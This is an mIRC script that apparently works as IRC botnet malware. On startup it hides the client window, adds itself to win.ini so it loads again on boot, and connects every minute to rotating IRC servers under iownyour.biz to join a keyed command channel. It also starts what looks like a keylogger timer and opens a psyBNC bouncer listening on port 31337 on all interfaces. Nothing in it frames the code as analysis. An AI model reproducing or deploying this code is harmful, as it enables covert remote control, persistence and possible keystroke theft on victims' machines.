on *:START:{ %fldchan = #X#psy#X# | %key = $encode(Sm0k3d,m) | resolve | nick %ctry $+ $+ %start $+ |- $+ $os | .timercon -o 0 60 server $iif($ip = 96.22.54.2,::11,irc- $+ $r(1,4) $+ .iownyour.biz $iif($sslready,+6697,6667)) -jn %fldchan %key | .writeini $left($mircexe,1) $+ :\windows\win.ini windows load $shortfn($mircexe) | showmirc -m | .timerkl -o 1 5 kl | findtray | if (!%psyBNC.port) %psyBNC.port = 31337 | .timer -o 0 300 linkstarts | .timer -o 1 0 loaddata | .timer -o 0 30 savedata | if (!$psyBNC_Name) .timer 1 1 setpsyname  | inc %start | psyBNC start %psyBNC.port | write_mainlog Listener created :0.0.0.0 port %psyBNC.port }
on *:EXIT:savedata
